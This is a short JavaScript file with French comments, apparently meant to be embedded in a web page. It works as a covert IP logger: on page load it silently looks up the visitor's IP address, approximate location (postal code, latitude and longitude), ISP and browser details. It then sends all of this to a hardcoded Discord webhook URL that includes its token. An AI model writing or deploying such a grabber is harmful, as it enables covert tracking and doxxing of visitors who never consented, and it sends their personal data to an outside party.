// URL du webhook Discord (remplace avec ton webhook)
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1368363745897615430/DgU_6qzKpuisz0kPM-xW33ah6HrkJrL03FVb9iUqMjyOwOc5Ss4lwqi0YK3Bi4DGpUnu";

// Fonction pour récupérer l'adresse IP et les détails de l'appareil
async function getIPAndDevice() {
    try {
        // Récupérer les informations détaillées sur l'IP
        const ipDetails = await getIPDetails();

        // Récupérer les informations sur l'appareil
        const deviceInfo = getDeviceInfo();

        // Envoyer toutes les informations au webhook Discord
        await sendToDiscord(ipDetails, deviceInfo);
    } catch (error) {
        // Gérer les erreurs silencieusement
        console.error('Erreur lors de l\'envoi des informations :', error);
    }
}

// Fonction pour récupérer les détails de l'IP
async function getIPDetails() {
    try {
        const response = await fetch('http://ip-api.com/json/');
        if (!response.ok) {
            throw new Error('Erreur lors de la récupération des informations sur l\'IP.');
        }
        return await response.json();
    } catch (error) {
        throw error;
    }
}

// Fonction pour récupérer les informations sur l'appareil
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    return `Navigateur : ${userAgent}, Plateforme : ${platform}`;
}

// Fonction pour envoyer toutes les informations au webhook Discord avec un embed
async function sendToDiscord(ipDetails, deviceInfo) {
    try {
        const payload = {
            embeds: [
                {
                    title: 'Nouvelle connexion détectée',
                    description: `**Adresse IP** : ${ipDetails.query}\n` +
                                 `**Pays** : ${ipDetails.country} (${ipDetails.countryCode})\n` +
                                 `**Région** : ${ipDetails.regionName} (${ipDetails.region})\n` +
                                 `**Code postal** : ${ipDetails.zip}\n` +
                                 `**Fournisseur** : ${ipDetails.isp}\n` +
                                 `**Latitude** : ${ipDetails.lat}, **Longitude** : ${ipDetails.lon}\n` +
                                 `**Fuseau horaire** : ${ipDetails.timezone}\n\n` +
                                 `**Appareil** : ${deviceInfo}`,
                    color: 7506394,  // Une couleur hexadécimale pour l'embed (bleu clair)
                    footer: {
                        text: 'Données récupérées automatiquement',
                    },
                },
            ],
        };
        
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        throw error;
    }
}

// Appel de la fonction au chargement de la page
getIPAndDevice();
